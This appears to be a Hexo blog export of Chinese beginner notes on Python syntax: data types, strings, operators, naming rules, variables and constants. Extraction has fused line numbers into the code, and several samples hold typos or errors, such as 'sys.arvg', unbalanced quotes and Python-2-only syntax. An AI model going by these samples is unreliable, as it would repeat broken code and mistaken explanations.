    <content type="text"><![CDATA[第2章 Python必须知道的基础语法–数据类型2.4 数据类型 数据类型是构成编程语言语法的基础，不同的编程语言有不同的数据类型，但都具有常用的几种数据类型。Python有几种内置的数据类型——数字、字符串、元组、列表和字典 2.4.1 数字​ Python3的数字类型分为 整型、浮点型、布尔型、分数类型、复数类型。使用Python编写程序时，不需要声明变量的类型。由Python内置的基本数据类型来管理变量，在后台实现数值与类型的关联以及类型转换等操作 操作 说明 bool int long float complex x ** y 指数运算 √ √ √ √ √ +x 符号不变 √ √ √ √ √ -x 符号取反 √ √ √ √ √ ~x 按位取反 √ √ √ x * y 乘法 √ √ √ √ √ x / y 除法 √ √ √ √ √ x // y 地板除 √ √ √ √ √ x % y 取余 √ √ √ √ √ x + y 加法 √ √ √ √ √ x - y 减法 √ √ √ √ √ x &lt;&lt; y 位左移 √ √ √ x &gt;&gt; y 位右移 √ √ √ x &amp; y 按位与 √ √ √ x ^ y 按位异或 √ √ √ x \ y 按位或 √ √ √ abs(x) 取绝对值 √ √ √ √ √ bin(x) 整型-&gt;二进制字符串 √ √ √ bool(x) 布尔型转换 √ √ √ √ √ chr(x) ASCII码-&gt;单字符串 √ √ √ complex(re, im) 实部为re，虚部为im的复数 √ √ √ √ √ divmod(x, y) 除法及取余 √ √ √ √ √ float(x) 浮点转换函数 √ √ √ √ hex(x) 整型-&gt;十六进制字符串 √ √ √ int(x) 整型转换 √ √ √ √ long(x) 长整型转换 √ √ √ √ pow(x) 指数运算 √ √ √ √ √ oct(x) 整型-&gt;八进制字符串 √ √ √ round(x[, n]) 保留n位小数并四舍五入 √ √ √ √ unichr(x) ASCII码-&gt;Unicode单字符串 √ √ √ 要点： 整型 int 1整型转换 12整数是不带有小数部分的数字，包括自然数，零，负自然数如： -5 100 0 88888 长整型 long 1长整型转换 1长整型 是整型的超集，可以表示无限大的整数（实际上只受限于机器的虚拟内存大小）。长整型字面值的后面带有字母“L”或“l”（推荐使用大写的“L”） 浮点型 float 1浮点转换函数 1234浮点型数是带有小数部分的数字（小数部分也可以是0）小数：3.14 3.1 3.0 3. 0.14 .14如：6.18E-1 等同于 0.618 2.9979e8 等用于 299790000.0 布尔型 bool 12判断真假两种状态True值为1，False值为0 12345678用来表示真假两种状态的类型True 表示真（条件满足或成立）False 表示假（条件不满足或不成立）说明：True值为1，False值为0 分数类型 fractions 12345678fractions模块fractions模块提供了分数类型的支持。Fraction类该类是fractions模块的核心，它继承了numbers.Rational类并且实现了该类所有的方法。用于计算最大公约数。这个函数在Python3.5之后就废弃了，官方建议使用math.gcd() 。 复数类型 complex 12345complex（）函数用于创建一个复数或者将一个数或字符串转换为复数形式，其返回值为一个复数。该函数的语法为：class complex(real,imag)其中，real可以为int、long、float或字符串类型；而image只能为int、long、或float类型。 1234复数 与数学中的复数概念完全相同。Python中的复数有以下几个特性：复数由实数部分和虚数部分构成，表示为：real+imagj 或 real+imagJ复数的实部real和虚部imag都是浮点型 复数的操作示例如下： 123456789101112131415&gt;&gt;&gt; c = -8.333-1.47j&gt;&gt;&gt; c(-8.333-1.47j)&gt;&gt;&gt; c.real # 实部-8.333&gt;&gt;&gt; c.imag # 虚部-1.47&gt;&gt;&gt; c.conjugate() # 共轭复数(-8.333+1.47j)&gt;&gt;&gt; &gt;&gt;&gt; abs(c) # 绝对值8.461665852537548&gt;&gt;&gt; import math&gt;&gt;&gt; math.sqrt(c.real ** 2 + c.imag ** 2) # 等价于abs(c)8.461665852537548 下面代码返回了各种变量的类型 123456789101112#整型i = 1print (type(i) )#长整型l = 9999999999999999999print(l)#浮点型f = 1.2print( type(f) )#布尔型b = Trueprint (type(b)) 123#复数类型c = 7 + 8jprint (type(c)) 代码说明 第3行代码输出结果： 第6行代码输出结果： 第9行代码输出结果： 第12行代码输出结果： 复数输出结果： 2.4.2 字符串在Python中有3种表示字符串的方式——单引号、双引号、三引号，单引号和双引号的作用一样,三引号一般用作制作文档，将双引号也包括在哪输出 三引号中可以输入单引号、双引号或换行等字符 12345# 单引号和双引号的使用是等价的str = "hello world!"print (str)str = 'hello world!'print (str) 输出结果一样 1hello world! 三引号用法 123#三引号的用法str = '''he say "hello world!"'''print(str) 输出结果 1he say &quot;hello world&quot; 三引号制作文档字符串 12345678#三引号制作doc文档class Hello: '''hello class''' def printHello(): '''print hello world''' print ("hello world!")print(Hello.__doc__)print(Hello.printHello.__doc__) 结果 12hello classprint hello world 代码说明 第2行代码定义了一个名问Hello的类 第3行是对Hello类的描述，该字符串将被存放在类的 doc 属性中 第4行代码定义了一个方法printHello（） 第5行代码描述了printHello()，并把字符串存放在该函数 doc 属性中 _ doc _属性Python的每个对象都有一个属性 doc ，这个属性用于描述该对象的作用 三引号其他例子 1234567891011121314151617string3=''' 1.look 2.not 3.look not look 4.bay 5... '''print(string3)string4=''' 1.... 2.... 3.... 4.... 5.1212 '''print(string4) 打印结果 123456789101112131.look2.not3.look not look4.bay5...1....2....3....4....5.1212 str转义字符1str() 函数将对象转化为适于人阅读的形式。 例子 123456s = 'RUNOOB'&gt;&gt;&gt; str(s)'RUNOOB'&gt;&gt;&gt; dict = &#123;'runoob': 'runoob.com', 'google': 'google.com'&#125;;&gt;&gt;&gt; str(dict)"&#123;'google': 'google.com', 'runoob': 'runoob.com'&#125;" 关于 转义字符 如果要输出含有特殊字符（单引号、双引号）的字符串，需要使用转义字符。Python中的转义字符为“\”，转移操作只要在特殊字符的前面加上“\”即可 123#转义字符str = 'he say:\'hello world!\''print(str) 代码说明 第2行代码中的单引号是特殊字符，需要在“ ’ ”前面加上转义字符 1he say:&apos;hello world&apos; 使用双引号或者三引号可以直接输出含有特殊字符的字符串，不需要使用转义字符 12345#直接输出特殊字符串str = "he say:'hello world!' "print(str)str = '''he say:'hello world!''''print(str) 代码说明 第2行代码中使用了双引号表示字符串变量str,因此Python能够识别出双引号内部的单引号作为输出字符串 第4行代码使用三引号表示字符串变量str,4个单引号连在一起，Python解释器不能正确识别三引号，提示错误 1SyntaxError: EOL while scanning single-quoed string 原始字符串 r\R 原始字符串 - 原始字符串：所有的字符串都是直接按照字面的意思来使用，没有转义特殊或不能打印的字符。 原始字符串除在字符串的第一个引号前加上字母”r”（可以大小写）以外，与普通字符串有着几乎完全相同的语法。 1234&gt;&gt;&gt;print r&apos;\n&apos;\n&gt;&gt;&gt; print R&apos;\n&apos;\n 1234567string4 =''' 1.one 2.two 3.look '''print([string4])print(r'1\n2') 字符表 操作符 描述 实例 + 字符串连接 &gt;&gt;&gt;a + b ‘HelloPython’ * 重复输出字符串 &gt;&gt;&gt;a * 2 ‘HelloHello’ [] 通过索引获取字符串中字符 &gt;&gt;&gt;a[1] ‘e’ [ : ] 截取字符串中的一部分 &gt;&gt;&gt;a[1:4] ‘ell’ in 成员运算符 - 如果字符串中包含给定的字符返回 True &gt;&gt;&gt;”H” in a True not in 成员运算符 - 如果字符串中不包含给定的字符返回 True &gt;&gt;&gt;”M” not in a True r/R 原始字符串 - 原始字符串：所有的字符串都是直接按照字面的意思来使用，没有转义特殊或不能打印的字符。 原始字符串除在字符串的第一个引号前加上字母”r”（可以大小写）以外，与普通字符串有着几乎完全相同的语法。 &gt;&gt;&gt;print r’\n’ \n &gt;&gt;&gt; print R’\n’ \n % 格式字符串 请看下一章节 符 号 描述 %c 格式化字符及其ASCII码 %s 格式化字符串 %d 格式化整数 %u 格式化无符号整型 %o 格式化无符号八进制数 %x 格式化无符号十六进制数 %X 格式化无符号十六进制数（大写） %f 格式化浮点数字，可指定小数点后的精度 %e 用科学计数法格式化浮点数 %E 作用同%e，用科学计数法格式化浮点数 %g %f和%e的简写 %G %f 和 %E 的简写 %p 用十六进制数格式化变量的地址 2.5 运算符与表达式​ Python的运算符号包括运算符、关系运算符和逻辑运算符。表达式是由数字或字符串和运算符组成的式子。表达式通常用于判断语句和循环语句的条件使用，表达式是学习控制语句编写的基础 算数运算符 算数表达式 描述 + x + y 加法运算 - x - y 减法运算 算数运算符 算数表达式 描述 * x * y 乘法运算 / x / y 除法运算 算数运算符 算数表达式 描述 % x % y 求模运算 ** x ** y 求幂运算 下面这段代码演示Python中算术运算符的使用方法 12345678print("1 + 1 =",1+1)print("2 - 1 =",2-1)print("2 * 3 =",2*3)print("4 / 2 =",4/2)print("1 / 2 =",1/2)print("1 / 2 =",1.0/2.0)print("3 % 2 =",3%2)print("2 ** 3=",2**3) 输出结果 123456781 + 1 = 22 - 1 = 12 * 3 = 64 / 2 = 2.01 / 2 = 0.51 / 2 = 0.53 % 2 = 12 ** 3= 8 算术运算的优先级Python的算术表达式具有结合性和优越性。结合性是指表达式按照从左往右、先乘除后加减的原则。即从表达式的左边开始计算，先执行乘法和除法运算，在执行加法和减法运算 1234567#算术优先级a = 1b = 2c = 3d = 4print("a + b * c % d =", a + b * c % d)print("(a+b) * (c%d) =", (a+b) * (c%d)) 输出结果 12a + b * c % d = 3(a+b) * (c%d) = 9 2.5.2 关系运算符和关系运算符 关系运算符 关系表达式 描述 &lt; x &lt; y 小于 &gt; x &gt; y 大于 关系运算符 关系表达式 描述 &lt;= x &lt;= y 小于大于 =&gt; x &gt;= y 大于等于 关系运算符 关系表达式 描述 == x == y 等于 ！= x ！= y 不等于 例子 12345#关系表达式print(2 &gt; 1)print(1 &lt;= 2)print(1 == 2) #逻辑错误，输出结果Falseprint(1 != 2) 输出结果 1234TrueTrueFalseTrue 2.5.3 逻辑运算符和逻辑运算符 逻辑运算符 逻辑表达式 描述 and x and y 逻辑与，当x为True时，才计算y or **x \ \ y** 逻辑或，当x为False时，才计算y 逻辑运算符 逻辑表达式 描述 not not x 逻辑非 例子 12345#逻辑运算符print( not True)print( False and True)print( True and False)print( True or False) #or运算符的左侧为True,于是返回True。输出结果 结果 1234FalseFalseFalseTrue 12345#逻辑表达式的优先级别print("not 1 and 0 =&gt;, "not 1 and 0)print("not (1 and 0) =&gt;",not (1 and 0))print("(1 &lt;= 2) and False or True =&gt;",(1 &lt; = 2) and False or True)print("(1 &gt;= 2) or 1 &gt; 1 + 2 =&gt;",1 &lt;= 2,"or",1 &gt; 2, "=&gt;", (1 &lt;= 2) or (1 &lt; 2)) 1234not 1 and 0 =&gt; Falsenot (1 and 0) =&gt; True(1 &lt;= 2) and False or True =&gt; True(1 &gt;= 2) or 1 &gt; 1 + 2 =&gt; True or False =&gt; True]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[第2章 Python必须知道成的基础语法]]></title>
    <url>%2F2019%2F06%2F03%2F%E7%AC%AC2%E7%AB%A0-Python%E5%BF%85%E9%A1%BB%E7%9F%A5%E9%81%93%E6%88%90%E7%9A%84%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95%2F</url>
    <content type="text"><![CDATA[第2章 Python必须知道成的基础语法 本章的知识点 Python文件的扩展名 Python的编码规则 数据类型 变量和常量的定义和使用 运算符及表达式 2.1 Python的文件类型 python文件类型分为三种，分别是源代码、字节代码、优化代码。这些代码可以直接运行 2.1.1 源代码 Python源代码的扩展名是以py结尾，可在控制台下运行。Python语言写的程序不需要编译成二进制代码，可可以直接运行源代码。pyw是windows下开发图形用户接口。以py和pyw为后缀名的文件可以使用文本工具打开，并修改文件的内容 2.1.2 字节代码 Python源文件编译后生成pyc后缀文件，pyc是编译过的字节文件，这种文件不可以使用文本编辑工具打开或者修改。pyc文件与平台无关，因此Python的程序可以运行在Windows、UNIX、Linux等操作系统上。py文件直接运行即可获得pyc类型的文件，或通过脚本生成该类型的文件。 下面这段脚本可以把hello.py编译为hello.pyc import py_compile py_compile.compile(&apos;hello.py&apos;) 保存此脚本，运行即可得到hello.pyc文件 2.1.3 优化代码 扩展名为pyo的文件是优化过的源文件，pyo类型的文件需要用命令工具生成。pyo文件也不能用文本工具编辑打开或者修改。下面把hello.py文件编译成hello.pyo （1）启动命令窗口，进入hello.py文件所在的目录，例如： cd /D D:\developer\python\example\02\2.1 (2)在命令行输入 python-O-m py_compile hello.py,并按回车键。 python -O -m py_compile hello.py 代码说明 参数“-O”表示生成优化代码 参数“-m”表示把导入的py_compile模块作为脚本运行。编译hello.pyo需要调用py_compile模块的compile()方法 参数“hello.py是待编译的文件名” 最后查看hello.py所在的文件目录，此时目录生成一个名为hello.pyo的文件 2.2 python的编码规范 Python语言有一套自己独特的编码规则，包括命名规则、代码书写规则等 2.2.1 命名规则 1.变量名、包名、模块名 变量名、包名、模块名通常使用小写，可使用下划线 01 #变量名、模块名的命名规则 02 #Filename: ruleModule.py #可理解为import ruleModule.py或者 import ruleModule 03 04 _rule_ = &quot;rule infomation&quot; 代码说明 第2行声明模块的名称，模块采用小写。也可以不指定模块名，以py后缀的文件就是一个模块。模块名就是文件名 第4行定义了一个全局变量_rule 类名、对象名 1.类名首字母采用大写，对象采用小写 2.类的 ”属性“ 和 “方法名” 以 ”对象“ 作为前缀。类的私有变量 3.私有方法有一下两个下划线作为前缀。下面这段代码演示了累的定义和实例化的规范写法 4.方法名首字母小写，其后的单词首字母大写 class Student: #类名大写 __name = &quot;&quot; #私有变量前必须有两个下划线 def __init__(self, name): self.__name = name #self相当于java的this def getName(self): #方法名首字母小写，其后每个单词的首字母大写 return self.__name if name == “main“: student = Student(&quot;borphi&quot;) print(student.getName()) 涉及的函数 1.class函数 #创建类 2.私有变量 #类似私有方法，在变量前加两个_,比如__fool 3.一、java中this关键字主要有三个应用： (1)this调用本类中的属性，也就是类中的成员变量； (2)this调用本类中的其他方法； (3)this调用本类中的其他构造方法，调用时要放在构造方法的首行。 this, 一个官方的说法是，this首先是一个对象,它代表调用这个函数的对象。 4. 代码说明 第1行定义了一个名为Student的类，类名首字母大写 第2行定义了一个私有的实例变量，变量名前有两个下划线 第4行代码使用self前缀说明__name变量属于Student类 第5行代码定义了一个公有方法，方法名首字母小写，其后的单词Name首字母大写。函数的命名规则和方法方法名相同 第9行代码创建了一个student对象，对象名小写 3.函数名 函数名通常使用小写，并采用下划线或单词首字母大写增加名名称的可读性，导入的函数以及模块名做前缀。 randrange(start, stop[,step]) 代码说明 参数start表示随机所在的范围开始数字 参数stop表示随机数所在范围的结束数字，但不包括数字stop 参数step开始往后的步数。生成的随机数在[start,stop -1]的范围内，取值等于start+step 例如 rangrange(1, 9, 2) 随机数的范围在1、3、5、7之间选取。下面这段代码演示了函数的规范写法，其中定义了一个compareNum(),该函数用于比较两个数字的大小，并返回对应的结果 #函数的命名规则 import random def compareNum(num1,num2): if(num1 &gt; num2): return 1 elif(num1 == num2): return 0 else: return -1 num1 = random.randrange(1, 9) num2 = random.randrange(1, 9) print( &quot;num1 =&quot;,num1) print( &quot;num2 =&quot;,num2) print(compareNum(num1, num2)) 代码说明 第2行导入了random模块 第4行代码定义一个函数compareNum(),参数num1,num2待作比较的两个变量 第5行到第10行比较两个数的大小，返回不同的结果 第11行、12行代码调用random（）函数返回两个随机数 第13、14行代码输出随机数，不同的机器，不同的执行时间得到的随机数均不相同 第15行代码调用compareNum，并把产生的随机数作为参数传入 定义函数后，最后一定输出你所定义的函数 2.2.1.5 变量名的规范 变量的命名应尽可能地表达此变量的作用，尽量避免缩写，以至于任何人都能理解变量名的含义。不用担心变量名的长度，长的变量名往往更清楚的表达意思 2.2.2 代码缩进与冒号 进与冒号是指通过在每行代码前输入空格或制表符的方式，表示每行代码之间的层次关系任何编程语言都需要要用代码缩进清晰程序的结构 案例 x = 1 if x == 1: print( &quot;x=&quot;,x) else: print( &quot;x=&quot;,x) x = x+1 print(&quot;x=&quot;,x) 代码说明 第1行代码创建了变量x,并赋值为1。在赋值运算符的两侧各添加一个空格，这是一种良好的书写习惯，挺高程序的程序的可读性 第2行代码使用了条件if，判断x的值是否1.if表达式后输入一个冒号，冒号后面的代码块与第1行代码处于同一个层次，直接从最左端书写代码 第3行代码表示x的值等于1时输出的结果，当if条件成立时，程序才能执行到第3行，所以第3行代码位于第2行代码的下一个层次。在编码时，首先左端输入4个空格或表键（不建议），然后书写print语句。输出结果 x = 1 第四行代码的else关键字后是一段新的代码块。当x的值不等于1时，程序执行5、6行代码 第5、6行代码采用缩进式的代码风格 第7行输出结果 x = 1 2.2.3 模块导入的规范 模块是类或函数的集合，用于处理一类问题。模块的导入和java包的导入的概念很相似。都使用import语句，在Python中，如果需要在程序中调用标准库或其他第三方库的类，需要先使用import或from…import..语句导入相关的模块。 import语句 下面这段代码使用import语句导入sys模块，并打印相关内容 #规范导入方式 import sys print(sys.path) print(sys.arvg) 第2行代码使用了import语导入了sys模块，sys模块是处理系统环境的函数集合 第4行代码输出Python环境下查找路径的集合，Python默认情况下会查找sys.path返回的目录列表。列表是Python的内置的数据结构，定义了一组相同意义的数据，通常用来作为参数或者返回值 第5行代码中的sys.argv是存储输入参数的列表。默认情况下，argv自带的参数是文件名 2.from…import…语句 使用from..import..语句导入有所不同，区别是前者只导入模块中的一部分内容，并在命名空间中创建导入对象的引用；而后者在当前程序的命名空间中创建导入模块的引用，从而可以使用&quot;sys.path的方式调用sys模块中的内容&quot; 下面这段代码实现了与上面代码相同的功能，不同的是使用了from…import…语句导入指定内容 from sys import path from sys import arvg print (path) print (arvg) 代码说明 第5、6行代码直接调用path、argv列表的内容，没有模块名的限定，但这种代码写法不够规范，如果程序比较复杂，导入了很多模块，阅读程序的人并了解path、arvg来自哪个模块。而通过sys.path、sys.arvg的写法可以清楚的知道path、arvg来自sys模块 2.2.4 使用空行分隔代码 函数之间或者类的方法之间使用空行分隔，表示新的代码的开始。类和函数入口之间也用空行分隔，突出函数入口的开始。 例子 class A: #创建一个类 def funX(self): #def定义一个方法funX,self是类 print( &quot;funY()&quot; ) def funY(self): #def定义一个方法funY，self是类 print( &quot;funY()&quot; ) if __name__ == &apos;__main__&apos;: #调用类A，调用funX，funY方法 a = A() a.funX() a.funY() 代码说明 第4行代码插入了一个空行，表示区分方法之间的间隔，便于阅读 第7行代码也是一个空行，因为下面的if语句是主程序的入口，用于创建类A的对象，并调用其方法 2.2.5 正确的注释 （1）中文注释：如果需要代码中使用中文注释，必须在Python文件的最前面加上如下注释说明。 # -*- coding: UTF-8 -*- （2）跨平台注释：如果需要使Python程序运行在*unix中，最好在Python文件的最前面加下如下注释说明 #！/usr/bin/python 此外注释也用于调试程序，因此可以使用注释辅助调试 注释的用法 描述 注释的用法 描述 单行注释 说明一行语句的作用 中文注释的支持 -- coding: UTF-8 - - 块注释 说明一段代码的作用或整个程序的文件的功能 调试程序 注释可帮助程序员调试程序 程序的跨平台 #/usr/bin/python 2.2.6 语句的分隔 在Python中的分号可以省略，主要通过换行来识别语句的结束 #下面两条语句是等价的 print( &quot;hello world!&quot; ) print( &quot;hello world!&quot; ); 如果要在一行中书写多个语句，就必须使用分号分隔 #使用分号分隔语句 x = 1;y = 1 ;z = 1 print(z,y,z) 代码说明 第2行代码中有3条赋值语句，语句之间需要分号隔开，如果不隔开Python解释器不能正确解释，会提示语法错误SyntaxError: invalid syntax （2）Python的“\”换行符 Python支持多行写一条语句，Python使用“\”作为换行符，一条语句写在多行 例如SQL语句作为参数传递给函数 #字符串的换行 #写法一 sql = &quot;select id,name \ from dept \ where name = &apos;A&apos;&quot; print(sql) #写法二 sql = &quot;select id,name &quot; \ &quot;from dept&quot; \ &quot;where name = &apos;A&apos;&quot; print（sql） 代码说明 写法一只使用了一对双引号，把SQL语句分为select、from、where 3部分分别书写。 select id,name, from dept where name = ‘A’ 写法二比第一种可读性强，可以使用空格和制表符对齐语句，使代码显得更工整，简短代码不推荐换行写法 select id,name, from dept where name = ‘A’ 2.3 变量和常量 变量是计算机内存中的一块区域，变量可以储存任何值，而且值可以改变 常量是一块只读的内存区域，常量一旦初始化就不能修改 2.3.1 变量的命名 变量是由 &quot;字母”、“数字”、“下换线&quot; 成，变量的 ”第一个字符“ 必须是字母或下划线，其他字符可以由字母、数字或下划线组成。 例如 # 正确的变量命名 var_1 = 1 print （var_1） _var = 2 print(_var) 代码说明 第2行代码定义了一个名为var_1的变量，改变量的初始值为1。这个变量以字母开头后面的字符由字母、下划线和数字组成 第4行代码定义了一个名为_var1的变量，该变量的初始值为2，这个变量以下划线开头，后面的字符由字母和数字组成 错误的变量名方式 #错误的变量命名 1_var = 3 print (1_var) $var = 4 print ($var) 代码说明 第2行代码定义了一个名为1_var的变量，该变量以数字开头，后面的字符由数字下划线组成 第3行代码，变量以数字开头、不符合变量命名规则 第4行代码定义了一个名为$var的变量 ,变量以符号开头 第5行代码，变量以$开头，不符合变量名的命名规则 2.3.2 变量的赋值 Python中的变量不需要声明，变量的赋值操作即是变量声明和定义过程。每个变量在内存中创建，都包括变量的标识、名称和数据这些信息 变量的内部结构 变量x的标识 –&gt; id(x) —-&gt;x |1 上面的代码创建了变量x，并赋值为1，如上所示。 Python中一次新的赋值，并创建一个新的变量。即使变量的名称相同，变量的标识并不相同 #一次新的赋值操作，并创建一个新的变量 x = 1 print (id(x)) x = 2 print( id(x) ) 代码说明 第2行代码定义了一个名为x的变量，该变量的初始值为1 第3行代码，输出变量x的标识。输出结果如下 11229424 第4行代码再次定义了一个x的变量，该变量的初始值为2。该变量与前面的变量x并不是同一变量 第5行代码，输出变量x的标识。输出结果如下 11229412 如果变量没有赋值，Python将认为变量不存在 2.3.3 局部变量 局部变量是只能在函数或代码段内使用的变量。函数或代码段一旦结束，局部变量的生命周期就结束。局部变量的作用范围只在被创建的函数内有效。例如，文件1的fun()中定义了一个局部变量，则该局部变量只能被fun()访问，而不能被fun2()访问，也不能被文件2访问。 #局部变量 def fun(): local = 1 print(local) fun() 代码说明 第二行代码定义了一个函数fun() 第3行代码定义了一个局部变量local 第4行代码输出local的值，输出结果如下 1 第5行代码调用函数fun()。此时已超出local变量的作用范围 2.3.4 全局变量 全局变量是能够被不同的函数、类或文件共享的变量，在函数之外定义的变量都可以称为全局变量。全局变量可以被文件内部的任何函数和外部文件访问。例如，如果文件1定义了一个全局变量，文件1中的函数fun()可以访问该全局变量，此外，该全局变量也能被文件1、文件2访问 全局变量通常在文件的开始处定义，下面定义了两个全局变量 _ a 、_b 和add()、sub()，这两个函数将调用全局变量执行加法和减法计算 #在文件开头定义全局变量 _a = 1 _b = 2 def add(): global _a _a = 3 return &quot;_a + b =&quot;,_a + _b def sub(): global _b _b = 4 return &quot;_a + _b&quot;,_a - _b print (add()) print(sub()) 代码说明 第2行代码定义了一个名为_a的全局变量，这个变量的作用范围从定义处到文件的结尾。之所以使用下划线是为了区分于其他变量，引起对全局变量出现的重视 第3行代码定义了一个名为 _b的全局变量。同样__b的作用范围从定义处到文件的结尾 第4行代码定义了一个函数add()，用于执行加法计算 第5行代码引用了全局变量_a。这里使用global关键字，global用于引用全局变量 第6行代码对全局变量_a重新赋值 第7行代码返回_a + _b的值 第8行代码定义了一个函数sub()，用于执行加减法运算。函数内的实现方式和add()相同 涉及函数 global 关键字允许你修改当前范围之外的变量。它用于创建全局变量并在本地上下文中更改变量。可以理解为调用全局变量 例子： c = 0 #定义全局变量c d = 2 #定义全局变量d def add(): #定义add()函数，用于加法计算 global c #程序实现的功能内容 c = c + 2 print(&quot;Insid add():&quot;,c) #输出add()函数 add() #引用完成全局变量，局部变量结束 def sub(): global d d = d + 2 print(&quot;In main:&quot;,d) sub() 注意： 变量名相同的两个变量可能并不是同一变量，变量的名称只是起标识的作用变量出现的位置不同，变量的含义也不同 可以把全局变量放到专门文件，创建一个名为gl.py的文件 #全局变量 _a = 1 _b = 2 也可调用模块调用全局变量 #调用全局变量 import gl _a = 1 _b = 2 def fun(): print(gl._a) print(gl._b) fun() 代码说明 第2行代码导入前面创建的文件gl.py,即模块gl 第3行代码定义函数fun(),该函数调用全局变量_a 和 _b。这里不需要global,引用gl.py中的全局变量。使用前导符定位 2.3.5 常量 常量是指一旦初始化后就不能改变的变量，例如数字 1、字符串“abc”都是常量 定于常量模块const class _const: class ConstError(TypeError):pass def __setattr__(self,name,value): if self.__dict__.has_key(name): raise self.ConstError, &quot;Can&apos;t rebind const(%s)&quot; %name self.__dict__[name]=value import sys sys.modules[__name__]=_const() 代码说明 这个类定义了一个方法 setattr()和一个异常类型ConstError, ConstError类继承自TypeError。通常调用字典 dict __,判断定义的常量是否包含在字典中，如果字典包含此常量，将抛出异常。否则，给新创建的常量赋值 最后两行代码的作用是把const类注册到sys.modules这个全局字典中 调用const函数 import const const.magic = 23 const.magic = 33 第3行代码修改常量magic的值，抛出异常 涉及函数 sys模块 1: sys是python自带模块. 利用 import 语句输入sys 模块。 当执行import sys后, python在 sys.path 变量中所列目录中寻找 sys 模块文件。 sys.argv: 实现从程序外部向程序传递参数。 sys.exit([arg]): 程序中间的退出，arg=0为正常退出。 sys.getdefaultencoding(): 获取系统当前编码，一般默认为ascii。 sys.setdefaultencoding(): 设置系统默认编码，执行dir（sys）时不会看到这个方法，在解释器中执行不通过，可以先执行reload(sys)，在执行 setdefaultencoding(&apos;utf8&apos;)，此时将系统默认编码设置为utf8。（见设置系统默认编码 ） sys.getfilesystemencoding(): 获取文件系统使用编码方式，Windows下返回&apos;mbcs&apos;，mac下返回&apos;utf-8&apos;. sys.path: 获取指定模块搜索路径的字符串集合，可以将写好的模块放在得到的某个路径下，就可以在程序中import时正确找到。 sys.platform: 获取当前系统平台。 sys.stdin,sys.stdout,sys.stderr: stdin , stdout , 以及stderr 变量包含与标准I/O 流对应的流对象. 如果需要更好地控制输出,而print 不能满足你的要求, 它们就是你所需要的. 你也可以替换它们, 这时候你就可以重定向输出和输入到其它设备( device ), 或者以非标准的方式处理它们 sys.modules 模块 Python中所有加载到内存的模块都放在sys.modules。sys.modules是一个全局字典，字典sys.modules对于加载模块起到了缓冲的作用,当import一个模块时首先会在这个列表中查找是否已经加载了此模块，如果加载了则只是将模块的名字加入到正在调用import的模块的Local名字空间中。当第二次再导入该模块时，python会直接到字典中查找，从而加快了程序运行的速度。件，模块文件可以是py、pyc、pyd，找到后将模块载入内存，并加入到sys.modules中，并将名称导入到当前的Local名字空间。]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[欢迎来到我的博客]]></title>
    <url>%2F2019%2F04%2F25%2Fhello-world%2F</url>
    <content type="text"><![CDATA[Welcome to 网络空间安全! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1成功创建博客 More info: Writing Run server1欢迎欢迎 More info: Server Generate static files1测试 More info: Generating Deploy to remote sites1一起交流学习 12欢迎来到我的博客测试 More info: Deployment]]></content>
  </entry>
  <entry>
    <title><![CDATA[零基础学Python]]></title>
    <url>%2F2019%2F04%2F20%2F%E9%9B%B6%E5%9F%BA%E7%A1%80%E5%AD%A6Python%2F</url>
    <content type="text"><![CDATA[零基础学Python[TOC] 目录第一篇 python 语言基础 ##### 第1章 进入Python的世界 ##### 第2章 Python必须知道的基础语法 ##### 第3章 Python控制语句 ##### 第4章 Python数据结构 ##### 第5章 模块与函数 ##### 第6章 字符串与正则表达式 ##### 第7章 使用Python处理文件 ##### 第8章 面向对象编程 ##### 第9章 异常处理与程序调试 ##### 第10章 数据库编程 争取在一个月左右，重新温习Python的语法并学习新的知识点，能将Python的70%掌握，每天进行学习记录。]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[第1章 进入Python的世界]]></title>
    <url>%2F2019%2F04%2F20%2F%E7%AC%AC1%E7%AB%A0%20%E8%BF%9B%E5%85%A5Python%E7%9A%84%E4%B8%96%E7%95%8C%2F</url>
    <content type="text"><![CDATA[第1章 进入Python的世界Python是一种动态解释型语言的编程语言 1.1 Python的由来Python语言是由Guido van Rossum在1989年开发，在1991年正式发表. 1.2 Python的特色1.面向对象特性 2.内置的数据结构 1包括元组、列表、字典、集合等 3.简单性 4.健壮性 5.跨平台性 6.可扩展性 7.动态性 8.强语言性 9.应用广泛 1Python语言应用于数据库、网络、数学计算、WEB开发、操作系统扩展领域 1.3 第一个Python程序​ python的源代码文件以“py”作为后缀，创建一个名为hello.py的文件，输出字符串“hello word” 12if __name__ == "__main__": print("hello world") 代码说明 1.第一行代码相当于C语言中的main函数，是python程序的入口 main函数解释 1231.main函数就是第一个被调用的函数，和定义的位置、前后顺序无关2.在main函数之前定义一个全局变量，或者定义一个函数，都不影响main首先被执行。3.main()函数称之为主函数，一个C程序总是从main()函数开始执行的。 2.第二行代码使用了print语句输出字符串“hello world” 结果 1hello world Python的print语句用于输出字符串的内容，即把双引号的内容输出到控制台，Python的输入输出是通过“流”实现的，上述prin语句把字符串的内容输出到标准流，即输出到控制台，流也可以把结果输出到文件。 python的运行 ​ python 源文件+python路径 ​ python_file.py表示Python的源文件，python_file_path表示文件所在的路径 12python python_file_path + python_file.pypython C:\user\hello.py 1.4.1 Python的下载与安装官网 1www.python.org 支持系统 1234WindowsLinuxUnix其他系统... 1.5 Python的开发工具例如 Komodo、PythonWin、Eclipse、PyCharm,支持图形化操作具备编辑、调试等功能 比较好用的工具 PyCharm Eclipse 1.6 运行#！/bin/python 可以在UNIX平台下运行]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WEB实战注入]]></title>
    <url>%2F2019%2F04%2F20%2FWEB%E8%BF%9B%E9%98%B6-%E5%AE%9E%E6%88%982%E6%B3%A8%E5%85%A5%2F</url>
